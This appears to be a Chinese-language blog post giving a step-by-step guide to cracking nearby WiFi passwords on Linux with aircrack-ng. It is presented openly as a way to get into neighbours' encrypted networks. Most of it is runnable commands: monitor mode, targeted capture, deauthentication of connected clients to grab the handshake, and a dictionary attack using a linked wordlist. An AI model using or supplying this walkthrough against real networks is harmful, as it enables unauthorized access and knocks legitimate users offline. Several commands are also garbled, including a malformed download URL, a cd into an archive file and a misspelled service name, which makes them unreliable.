---
title: Linux 暴力破解WIFI密码
date: 2017-10-07 14:21:47
tags:
- 破解
- 网络安全
categories: 代码笔记
author:
	nick: 王恒

subtitle: linux 暴力破解附近 WiFi 密码，亲测可行。主要你有足够强大的字典以及CPU，理论上可以破解任何密码

cover: /img/20180517-2.jpg
---
请一直相信，任何牛逼的技术都是被苦逼的现实需求逼迫的。
当你抱着你的Mac、Iphone、Ipad准备打开王者荣耀，大喊一声“是时候展现真的技术了！”，结果你却发现这TMD没有网！！！啊啊啊啊啊，什么！你说这个世界如果没有了网络，你都找不到活着的意义？no no no，望着周围的一个个加密的wifi。于是，我决定来一场悄无声息的潜入.........

<!-- more -->
### 1.1 运行环境
- ubuntu 16.04
- 可用的无线网卡

### 1.2 安装aircrack
```
# 下载
wget http://download,aircrack-ng.org/aircrack-ng-1.2-rc2.tar.gz
# 解压
tar -zxvf aircrack-ng-1.2-rc2.tar.gz
# 进入目录
cd aircrack-ng-1.2-rc2.tar.gz
# 安装
make install
```

### 1.3 打开网络监听
```
# 关闭网络干扰
sudo airmon-ng check kill

# 查看网卡信息
iwconfig

# 打开监听(wlan0 为无线网卡接口名称)
airmon-ng start wlan0
```

### 1.4 监听网络
```
# 可用看到附近的WIFI情况
sudo airodump-ng mon0
```

这时候可用看到周围一些wifi信息，我们破解wifi 用到的是BSSID（路由器 Mac 地址）， CH（频道），ESSID（WIFI 名称）。

### 1.5 监听指定网络并写入文件
终端输入命令
```
sudo airodump-ng --bssid 路由器Mac地址 -c 频道 -w ./mywifi/tmp mon0
# -c 后面是监听指定wifi所在的频道
# -w 后面指定的是文件要写入的路径
# -mon0 是之前我们指定的网卡接口名称
```

### 1.6 获取握手包
打开一个新的终端， 输入
```
sudo aireplay-ng -0 2 -a 路由器 Mac 地址 -c 客户端 Mac 地址 mon0
# -a 后面是监听的路由器Mac地址
# -c 后面的是客户机器的Mac地址（正在连接此路由器的设备）
```

### 1.7 破解密码
此时你的./mywifi 文件夹下面已经写入了一些文件，此时你还缺少.txt字典文件。点击下载[百度云盘字典文件](http://pan.baidu.com/s/1nuDVqwl) 下载密码：wj1e

执行破解

```
# 1.txt 为字典文件
# tmp-02.cap 为 1.6 获取在./mywifi 文件夹下的握手包
sudo aircrack-ng -w 1.txt tmp-02.cap
```
当屏幕出现KEY FOUND! [ 破解出来的密码 ]

### 1.8 善后
 关闭网络监听
 ```
 sudo airmon-ng stop mon0
 ```

开启网络
```
sudo service network-mannger start
```
### 2.0 完
